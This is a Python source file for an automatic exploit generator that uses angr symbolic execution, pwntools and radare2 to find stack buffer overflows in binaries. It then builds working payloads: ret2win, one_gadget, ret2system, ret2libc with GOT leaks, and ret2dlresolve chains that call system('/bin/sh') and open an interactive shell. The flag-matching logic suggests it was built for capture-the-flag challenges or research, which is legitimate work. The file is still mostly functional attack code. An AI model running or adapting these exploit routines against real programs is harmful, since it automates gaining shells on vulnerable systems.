import PwnContext as pwn
import json
from functools import wraps

import angr
from angr.storage.memory_mixins.address_concretization_mixin import MultiwriteAnnotation

from .my_utils import (init_r2, killmyself, set_concrete, check_r2_one, pack,
                       unpack, get_di_register, get_sp_register)


class angr_gets(angr.SimProcedure):
    #pylint:disable=arguments-differ
    def run(self, dst):
        fd = 0
        simfd = self.state.posix.get_fd(fd)
        if simfd is None:
            return 0
            
        max_size = self.state.libc.max_gets_size

        # case 0: the data is concrete. we should read it a byte at a time since we can't seek for
        # the newline and we don't have any notion of buffering in-memory
        if simfd.read_storage.concrete:
            count = 0
            while count < max_size - 1:
                data, real_size = simfd.read_data(1)
                if self.state.solver.is_true(real_size == 0):
                    break
                self.state.memory.store(dst + count, data)
                count += 1
                if self.state.solver.is_true(data == b'\n'):
                    break
            self.state.memory.store(dst + count, b'\0')
            return dst

        # case 2: the data is symbolic, the newline could be anywhere. Read the maximum number of bytes
        # (SHORT_READS should take care of the variable length) and add a constraint to assert the
        # newline nonsense.
        # caveat: there could also be no newline and the file could EOF.
        else:
            data, real_size = simfd.read_data(max_size)

            for i, byte in enumerate(data.chop(8)):
                self.state.add_constraints(self.state.solver.If(
                    i+1 != real_size, 
                    byte != b'\n',
                    self.state.solver.Or(            # otherwise one of the following must be true:
                        i+2 == max_size,                 # - we ran out of space, or
                        simfd.eof(),                 # - the file is at EOF, or
                        byte == b'\n'                # - it is a newline
                    )))
            self.state.add_constraints(byte == b'\n')# gets最后加入\n

            self.state.memory.store(dst, data, size=real_size)
            end_address = dst + real_size - 1
            end_address = end_address.annotate(MultiwriteAnnotation())
            self.state.memory.store(end_address, b'\0')

            return dst

class Bof_Aeg(object):
    def __init__(self, filepath: str, elf: pwn.ELF, inputpath: str, outputpath: str, libpath: str, p, base_addr=0x555555554000):
        self.project = angr.Project(filepath, load_options={'auto_load_libs': False}, main_opts={'base_addr': base_addr})
        self.project.hook_symbol('gets',angr_gets())
        self.cfg = self.project.analyses.CFG(normalize=True)
        self.elf = elf
        self.inputpath = inputpath
        self.outputpath = outputpath
        self.filepath = filepath
        self.libpath = libpath
        self.p = p

        add_options = {
            angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
            angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
            angr.options.REVERSE_MEMORY_NAME_MAP,
            #angr.options.STRICT_PAGE_ACCESS, # Raise a SimSegfaultError on illegal memory accesses
            #angr.options.TRACK_ACTION_HISTORY,
        }
        remove_options = {
            #angr.options.LAZY_SOLVES
        }

        state = self.project.factory.entry_state(add_options=add_options,remove_options=remove_options)
        state.libc.buf_symbolic_bytes = 0x1000
        state.libc.max_str_len = 0x1000
        state.libc.max_gets_size = 0x200 # define gets() size; If the overflow is too long, it will affect the envp of the system.

        self.entry_state = state.copy()
        self.setup_arch_args()
        
        
    def setup_arch_args(self):
        if pwn.context.arch == 'amd64':
            self.word_size = 8
            self.reg_prefix = 'r'
        elif pwn.context.arch == 'i386':
            self.word_size = 4
            self.reg_prefix = 'e'
        else:
            raise NotImplementedError(f"This tool is not yet supported the architecture {pwn.context.arch}")
        

    def int_overflow(self, value, offset, prefix=b''):
        if isinstance(prefix, bytes):
            payload = prefix
        elif isinstance(prefix, str):
            payload = prefix.encode()
        payload += b'\0'*(offset-8-len(prefix)) + pack(value)
        self.p.sendline(payload)
        self.p.interactive()

    def find_stack_bof(self):
        """Exploring stack overflow vulnerabilities
        """
        pwn.log.info("Finding stack bof...")

        state = self.entry_state.copy()
        simgr = self.project.factory.simgr(state, save_unconstrained=True)
        simgr.explore(find=0xdeadbeef,step_func=overflow_detect_filter(self, self.elf))

        if simgr.found == []:
            pwn.log.error("Cannot find stack bof.")

    def find_win(self): # fix bugs
        """
        Looking for backdoors:
        1. system("/bin/sh") or system("cat flag") or fopen("cat flag")
        2. print flag to stdout
        """
        pwn.log.info("Finding win...")
        self.win_addr = 0

        # Look for system("/bin/sh") or system("cat flag")
        if 'system' in self.elf.plt:
            system_node = self.cfg.model.get_any_node(self.elf.plt['system'])
            if system_node:
                for pre in system_node.predecessors:
                    # node may be included
                    if pre.addr <= system_node.addr and pre.addr + pre.size < system_node.addr:
                        continue
                    state = self.project.factory.blank_state(
                    addr = pre.addr,
                    mode = 'fastpath') # we don't want to do any solving
                    simgr = self.project.factory.simgr(state)
                    simgr.explore(find=pre.addr+pre.size-5)

                    st = simgr.found[0]
                    arg = st.memory.load(get_di_register(st), self.word_size) 
                    if arg.uninitialized:
                        break
                    cmd = st.solver.eval(st.memory.load(get_di_register(st), self.word_size),cast_to=bytes)
                    cmd13 = st.solver.eval(st.memory.load(get_di_register(st),13),cast_to=bytes)
                    if cmd in (b'/bin/sh\x00',b'cat flag') or cmd13 == b'/bin/cat flag':
                        self.win_addr = pre.addr
                        pwn.log.info("Found system(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
                        
                    
        if 'fopen' in self.elf.plt:
            fopen_node = self.cfg.model.get_any_node(self.elf.plt['fopen'])
            if fopen_node:
                for pre in fopen_node.predecessors:
                    # node may be included
                    if pre.addr <= fopen_node.addr and pre.addr + pre.size < fopen_node.addr:
                        continue
                    state = self.project.factory.blank_state(
                    addr = pre.addr,
                    mode = 'fastpath') # we don't want to do any solving
                    simgr = self.project.factory.simgr(state)
                    simgr.explore(find=pre.addr+pre.size-5) # find addres of fopen
                    
                    st = simgr.found[0]
                    # print(st.regs.eip)
                    
                    # Find address of string "flag", "flag.txt"
                    arg = st.memory.load(get_di_register(st), self.word_size) 
                    if arg.uninitialized:
                        break
                    cmd = st.solver.eval(st.memory.load(get_di_register(st), self.word_size),cast_to=bytes)
                    cmd13 = st.solver.eval(st.memory.load(get_di_register(st),13),cast_to=bytes)
                    # print(cmd, cmd13)

                    if cmd in (b'flag.txt',b'flag', b'/flag.txt', b'/flag'):
                        self.win_addr = pre.addr
                        pwn.log.info("Found fopen(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
                        
                    
        # looking for print flag to stdout
        flag_addrs = []
        flag_addrs.extend(list(self.elf.search(b'flag\x00')))
        flag_addrs.extend(list(self.elf.search(b'flag.txt\x00')))

        for flag_addr in flag_addrs:
            xrefs = self.cfg.kb.xrefs.get_xrefs_by_dst(flag_addr)
            while xrefs != set():
                tmp = xrefs.pop()
                pwn.log.info("Testing flag block address :0x%x..."%tmp.block_addr)

                r2 = init_r2(self.filepath, b'')
                # Execute to the end of the first block of main
                first_block = self.project.factory.block(self.elf.sym['main'])
                # continue until a specific address
                addr_dcu = hex(\
                    first_block.addr+first_block.size-first_block.capstone.insns[-1].size)
                r2.cmd('dcu '+addr_dcu)
                r2.cmd(f'dr {self.reg_prefix}ip='+hex(tmp.block_addr)) # set register value
                r2.cmd('dc') # continue process execution
                with open(self.outputpath,'rb') as f:
                    print(f.read())
                    if b'flag{test}' in f.read():
                        self.win_addr = tmp.block_addr
                        pwn.log.info("Found flag win_addr :0x%x"%self.win_addr)
                        return
        if not self.win_addr:
            pwn.log.info("No win found!")
    
    def explore_to_win(self):
        """Use symbolic execution to explore to win
        """
        pwn.log.info("Exploring to win...")
        if not self.win_addr:
            pwn.log.info("No win!")
            return
        
        state = self.entry_state.copy()
        simgr = self.project.factory.simgr(state)
        simgr.explore(find=self.win_addr)

        if simgr.found != []:
            pwn.log.success("Exploration success!")
            payload = b"".join(simgr.found[0].posix.stdin.concretize())
            print(payload)
            self.p.sendline(payload)
            try:
                self.p.interactive()
            finally:
                killmyself()
        else:
            pwn.log.info("Exploration failed!")

    def find_leak(self, shift_offset=0):
        """Find address leaks in programs
        """
        pwn.log.info("Finding text/libc leak...")
        self.has_text_leak = False
        self.has_libc_leak = False

        r2 = init_r2(self.filepath, b'')
        r2.cmd('dc') # continue execution
        with open(self.outputpath,'rb') as f:
            data = f.read()
        map_data = json.loads(r2.cmd('dmj')) # List memmaps in JSON format
        print(map_data)
        
        ## usally receives 6 bytes address in 'data'
        if (b'0x' in data or b'\x55'*3 in data): # text leak, check if 0x555555 in data or not
            if b'0x' in data:
                aid = data.index(b'0x')
                leak = int(data[aid:aid+14],16) # converts 6 bytes into int, include 0x
                recv_str = data[:aid] # receive until address
                recv_type = 'str'
            else:
                aid = data.rindex(b'\x55'*3)
                leak = unpack(data[aid-5:aid+1].ljust(8,b'\x00'))
                recv_str = data[:aid-5]
                recv_type = 'byte'
            debug_test_base = 0
            debug_libc_base = 0
            for i in map_data:
                if self.elf.path in i['name']:
                    if not debug_test_base: debug_test_base = i['addr']
                    if i['addr'] <= leak and leak < i['addr_end']:
                        pwn.log.info("Found debug text leak: 0x%x"%leak)
                        self.has_text_leak = True
                        self.text_offset = leak - debug_test_base
                        break
                if self.libpath in i['name']:
                    if not debug_libc_base: debug_libc_base = i['addr']
                    if i['addr'] <= leak and leak < i['addr_end']:
                        pwn.log.info("Found debug libc leak: 0x%x"%leak)
                        self.has_libc_leak = True
                        self.libc_offset = leak - debug_libc_base
                        break

        if not self.has_text_leak and not self.has_libc_leak:
            pwn.log.error("PIE and No leak!")

        self.p.recvuntil(recv_str)
        if recv_type == 'str':
            leak = int(self.p.recv(14),16)
        elif recv_type == 'byte':
            leak = unpack(self.p.recv(6).ljust(8,b'\x00'))

        if self.has_text_leak:
            pwn.log.info("Found remote text leak :0x%x"%leak)
            self.text_base = leak - self.text_offset
            self.elf.address = self.text_base
            self.__init__(self.filepath, self.elf, self.inputpath, self.inputpath
                          , self.libpath, self.p, self.text_base)
            pwn.log.info("text_base :0x%x"%self.text_base)
        elif self.has_libc_leak:
            pwn.log.info("Found remote libc leak :0x%x"%leak)
            self.libc_base = leak - self.libc_offset - shift_offset
            pwn.log.info("libc_base :0x%x"%self.libc_base)
        
        self.leak_recv_str = recv_str
        self.leak_recv_type = recv_type

    def get_shell(self):
        """Select vulnerability exploitation techniques based on analysis
        """
        if self.win_addr:
            self.p.info("Using r2w technique")
            self.ret_to_win()
        if self.elf.pie and self.has_libc_leak: # There is a libc address leak，ret to one_gadget/system
            self.p.info("Using r2o technique")
            self.ret_to_one()
            self.p.info("Using r2s technique")
            self.ret_to_system()
        elif not self.ret_to_libc(): # There is no function available for leak
            self.p.info("Using r2dl technique")
            self.ret_to_dlresolve()

    def find_matches_flag(self, data, pattern=None):
        import re
        
        if pattern:
            flag_pattern = pattern
        else:
            flag_pattern = rb'flag\{[^}]+\}'
        
        try:
            print(f"Using {data} to find flag with regex")
            matches = re.findall(flag_pattern, data)
        
            if matches:
                self.p.info(f"Found flag {matches[0]}")
                return matches[0]
        except Exception as e:
            self.p.info(e)
        
        
        return False
    
    def ret_to_win(self, offset=0):
        """Modify the return address to win
        """
        if offset:
            payload = b'a'*offset + pack(self.win_addr)
            print(payload)
            self.p.sendline(payload)
            self.p.interactive()
            return
        pwn.log.info("Trying tech{ret_to_win}...")

        win_addr = self.win_addr if not self.elf.pie else self.win_addr-self.elf.address+self.text_base
        state: angr.SimState = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, pack(win_addr))
        payload = b''.join(state.posix.stdin.concretize())
        
        # system has movaps(check rsp & 0xf == 0)

        self.p.sendline(payload)
        try:
            res = self.p.recv(timeout=0.1)
            
            print('Find flag in stage 1 of r2w')
            find_flag_ret = self.find_matches_flag(res)
            print(res)
            if find_flag_ret:
                self.p.close()
                killmyself()

            self.p.sendline(b'cat flag.txt') # any valid command
            res = self.p.recvall(timeout=0.1)
            print('Find flag in stage 2 of r2w')
            find_flag_ret = self.find_matches_flag(res)
            print(find_flag_ret)
            if find_flag_ret:
                if self.p.can_recv():
                    self.p.interactive()
                print('killed')
                killmyself()
            # self.p.interactive()
                
        except KeyboardInterrupt:
            killmyself()
        except Exception as e: # The backdoor failed, possibly due to a stack alignment problem in the system.
            print('close 2', e)
            self.p.close()
            self.p = pwn.process(self.filepath, env={'LD_LIBRARY_PATH':self.libpath})
            if self.elf.pie: # Need to leak again
                if self.leak_recv_type == 'str':
                    leak = int(self.p.recv(14),16)
                elif self.leak_recv_type == 'byte':
                    leak = unpack(self.p.recv(6).ljust(8,b'\x00'))
                pwn.log.info("Found remote text leak :0x%x"%leak)
                self.text_base = leak - self.text_offset
                pwn.log.info("text_base :0x%x"%self.text_base)

            rop = self.get_rop()
            state = self.vuln_state.copy()
            set_concrete(state, self.vuln_control_addrs, pack(rop.search(regs=['rdi']).address+1)+pack(win_addr))
            payload = b''.join(state.posix.stdin.concretize())
            self.p.sendline(payload)
            try:
                self.p.interactive()
            finally:
                killmyself()

    def ret_to_one(self):
        """There is a libc address leak, ret to one_gadget
        """
        pwn.log.info("Trying tech{ret_to_one}...")

        r2 = init_r2(self.filepath, self.vuln_input)
        r2.cmd('dcu '+hex(self.vuln_addr)) # continue until a specific address
        one_offset = check_r2_one(r2, stack_off=8)

        if not one_offset:
            pwn.log.info("No one_offset found!")
            return
        pwn.log.info("Found one_offset :0x%x"%one_offset)

        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, pack(self.libc_base+one_offset)[:6])
        getshell = b''.join(state.posix.stdin.concretize())
        self.p.sendline(getshell)
        print(getshell.hex())
        try:
            self.p.interactive()
        finally:
            killmyself()

    def ret_to_system(self):
        """There is a libc address leak, ret to system
        """
        pwn.log.info("Trying tech{ret_to_system}...")

        tmp_libc = pwn.ELF(self.libpath+'libc.so.6',checksec=False)
        tmp_libc.address = self.libc_base
        try:
            pwn.ROP.clear_cache()
        except:
            pass
        rop = pwn.ROP(tmp_libc)
        rop.call(tmp_libc.sym['system'], [next(tmp_libc.search(b'/bin/sh\x00'))])
        
        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, rop.chain())
        getshell = b''.join(state.posix.stdin.concretize())
        self.p.sendline(getshell)
        try:
            self.p.interactive()
        finally:
            killmyself()

    def ret_to_libc(self):
        """
        First construct the rop chain to leak the libc address,
        Then use return-to-libc technology to execute system("/bin/sh")
        """
        pwn.log.info("Trying tech{ret_to_libc}...")

        leak_got = None
        rop = self.get_rop()
        if 'puts' in self.elf.plt:
            leak_got = 'puts'
        elif 'printf' in self.elf.plt:
            leak_got = 'printf' # There may be movaps stack alignment checks

        if not leak_got:
            pwn.log.info("No stdout function available for leak.")
            return False
        pwn.log.info("Found leak_got :"+leak_got)

        leak_addr = self.elf.got[leak_got] if not self.elf.pie else self.elf.got[leak_got]-self.elf.address+self.text_base
        rop.call(leak_got, [leak_addr])

        vuln_func_addr = self.vuln_func.address if not self.elf.pie else self.vuln_func.address-self.elf.address+self.text_base
        
        payload = b''
        payload += pack(rop.rdi.address+1) # movaps align
        payload += rop.chain()
        payload += pack(vuln_func_addr)

        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, payload)
        rop_chain = b''.join(state.posix.stdin.concretize())

        self.p.send(rop_chain)

        leak_addr = unpack(self.p.recvuntil(b'\x7f',drop=False)[-6:].ljust(8,b'\x00'))
        pwn.log.info("leak_addr: 0x%x"%leak_addr)

        libc = pwn.ELF(self.libpath+'libc.so.6',checksec=False)
        libc_base = leak_addr - libc.sym[leak_got]
        pwn.log.info("libc_base: 0x%x"%libc_base)

        system_addr = libc_base + libc.sym['system']
        pwn.log.info("system_addr: 0x%x"%system_addr)

        binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
        pwn.log.info("binsh_addr: 0x%x"%binsh_addr)

        rop = self.get_rop()
        rop.call(system_addr, [binsh_addr])

        payload = b''
        #payload += pack(rop.rdi.address+1) # movaps align
        payload += rop.chain()

        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, payload)
        getshell = b''.join(state.posix.stdin.concretize())
        self.p.sendline(getshell)
        try:
            self.p.interactive()
        finally:
            killmyself()

    def ret_to_dlresolve(self):
        pwn.log.info("Trying tech{ret_to_dlresolve}...")

        rop, dlresolve = self.get_rop(need_dlresolve=True)
        
        if 'gets' in self.elf.plt:
            rop.call('gets',[dlresolve.data_addr])
        elif 'read' in self.elf.plt:
            rop.call('read',[0,dlresolve.data_addr])
            
        rop.ret2dlresolve(dlresolve)

        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, rop.chain())
        rop_chain = b''.join(state.posix.stdin.concretize())
        self.p.send(rop_chain)
        pwn.sleep(0.1)
        self.p.sendline(dlresolve.payload)
        try:
            self.p.interactive()
        finally:
            killmyself()

    def get_rop(self, need_dlresolve=False):
        """Return pwnlib.rop.rop and dlresolve according to pie situation
        """
        try:
            pwn.ROP.clear_cache()
        except:
            pass
        if self.elf.pie:
            tmp = pwn.ELF(self.filepath,checksec=False)
            tmp.address = self.text_base
            rop = pwn.ROP(tmp)
            if need_dlresolve:
                dlresolve = pwn.Ret2dlresolvePayload(tmp, symbol="system", args=["/bin/sh\x00"])
        else:
            rop = pwn.ROP(self.elf)
            if need_dlresolve:
               dlresolve = pwn.Ret2dlresolvePayload(self.elf, symbol="system", args=["/bin/sh\x00"])
        if not need_dlresolve:
            return rop
        else:
            return rop, dlresolve

def prep_for_overflow_detect_filter(func):
    return func()


def overflow_detect_filter(bof_aeg: Bof_Aeg, elf: pwn.ELF):
    """Detect whether there is a stack overflow vulnerability
    """
    
    def overflow_detect_filter(simgr: angr.SimulationManager=None):
        for state in simgr.unconstrained:
            if state.regs.pc.symbolic:
                pwn.log.info("Found vulnerable state.")
                bof_aeg.vuln_state = state.copy()

                tmp = list(state.regs.pc.variables)
                variables = []
                # Only keep stdin
                for i in tmp:
                    if 'stdin' in i:
                        variables.append(i)

                if len(variables) > 1:
                    pwn.log.error("Stack overflow caused by more than one stdin?")

                vuln_block = bof_aeg.project.factory.block(list(state.history.bbl_addrs)[-1])
                bof_aeg.vuln_addr = vuln_block.addr + vuln_block.size - 1
                pwn.log.info("Vuln_addr: 0x%x"%bof_aeg.vuln_addr)
                bof_aeg.vuln_input = b''.join(state.posix.stdin.concretize())

                for name,func in elf.functions.items():
                    if func.address <= vuln_block.addr and vuln_block.addr < func.address+func.size:
                        pwn.log.info("Vuln_func(%s): 0x%x"%(name,func.address))
                        bof_aeg.vuln_func = func

                if state.regs.pc.symbolic:
                    # Get the controllable symbol symbol address after rbp+8(pc)
                    rbp = state.solver.eval(get_sp_register(state) - 0x10)
                    tmp = list(state.memory.addrs_for_name(variables[0]))
                    tmp.sort()
                    for i in range(len(tmp)):
                        if tmp[i] == rbp+8:
                            bof_aeg.vuln_control_addrs = tmp[i:]
                            break

                simgr.stashes["found"].append(state)
                simgr.stashes["unconstrained"].remove(state)
                break

        return simgr
    return overflow_detect_filter
